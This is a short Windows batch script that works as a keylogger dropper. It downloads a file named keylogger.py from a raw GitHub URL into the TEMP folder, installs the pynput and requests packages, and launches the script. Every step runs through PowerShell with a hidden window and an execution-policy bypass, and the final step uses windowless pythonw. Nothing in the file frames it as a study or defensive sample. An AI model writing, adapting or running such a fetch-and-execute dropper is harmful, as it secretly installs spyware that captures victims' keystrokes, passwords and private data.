@echo off
set GITHUB_SCRIPT_URL=https://raw.githubusercontent.com/ShreyasMahajann/ads/842414f968a5681dabed55ba105c8416cc5bd4ab/keylogger.py

:: Download the script
powershell -w h -ep bypass -c "(New-Object Net.WebClient).DownloadFile('%GITHUB_SCRIPT_URL%', '%TEMP%\\keylogger.py')"

:: Install required Python packages
powershell -w h -ep bypass -c "pip install pynput requests"

:: Execute the script
powershell -w h -ep bypass -c "pythonw '%TEMP%\\keylogger.py'"
